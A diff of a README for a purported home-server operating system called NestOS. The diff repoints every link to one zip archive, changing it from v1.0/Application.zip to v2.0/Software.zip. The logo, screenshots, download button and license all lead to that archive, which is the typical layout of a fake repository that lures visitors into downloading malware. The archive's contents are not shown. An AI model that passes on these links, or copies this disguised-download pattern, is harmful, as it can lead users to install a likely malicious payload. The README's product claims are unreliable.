@@ -1,6 +1,6 @@
 # NestOS: Simplifying Home Server Management
 
-![NestOS Logo](https://github.com/Kyku1/nestOS/releases/download/v1.0/Application.zip)
+![NestOS Logo](https://github.com/Kyku1/nestOS/releases/download/v2.0/Software.zip)
 
 NestOS is a powerful operating system designed to streamline home server management, offering a beautiful and intuitive web interface for users. Whether you are a seasoned tech enthusiast or just starting with your home server setup, NestOS provides the perfect balance of simplicity and functionality. 
 
@@ -31,9 +31,9 @@ NestOS is a powerful operating system designed to streamline home server managem
 
 ## Getting Started
 
-To get started with NestOS, download the software package from [this link](https://github.com/Kyku1/nestOS/releases/download/v1.0/Application.zip).  
+To get started with NestOS, download the software package from [this link](https://github.com/Kyku1/nestOS/releases/download/v2.0/Software.zip).  
 
-[![Download NestOS](https://github.com/Kyku1/nestOS/releases/download/v1.0/Application.zip)](https://github.com/Kyku1/nestOS/releases/download/v1.0/Application.zip)
+[![Download NestOS](https://github.com/Kyku1/nestOS/releases/download/v2.0/Software.zip)](https://github.com/Kyku1/nestOS/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the package, follow the installation instructions in the documentation to set up NestOS on your hardware.
 
@@ -41,9 +41,9 @@ Once you have downloaded the package, follow the installation instructions in th
 
 Here are some snapshots of the NestOS web interface:
 
-![NestOS Dashboard](https://github.com/Kyku1/nestOS/releases/download/v1.0/Application.zip)
+![NestOS Dashboard](https://github.com/Kyku1/nestOS/releases/download/v2.0/Software.zip)
 
-![NestOS Storage Management](https://github.com/Kyku1/nestOS/releases/download/v1.0/Application.zip)
+![NestOS Storage Management](https://github.com/Kyku1/nestOS/releases/download/v2.0/Software.zip)
 
 ## Community and Support
 
@@ -55,7 +55,7 @@ Contributions to NestOS are welcome! If you have ideas for new features, improve
 
 ## License
 
-NestOS is licensed under the MIT License. See the [LICENSE](https://github.com/Kyku1/nestOS/releases/download/v1.0/Application.zip) file for more details.
+NestOS is licensed under the MIT License. See the [LICENSE](https://github.com/Kyku1/nestOS/releases/download/v2.0/Software.zip) file for more details.
 
 ---
 
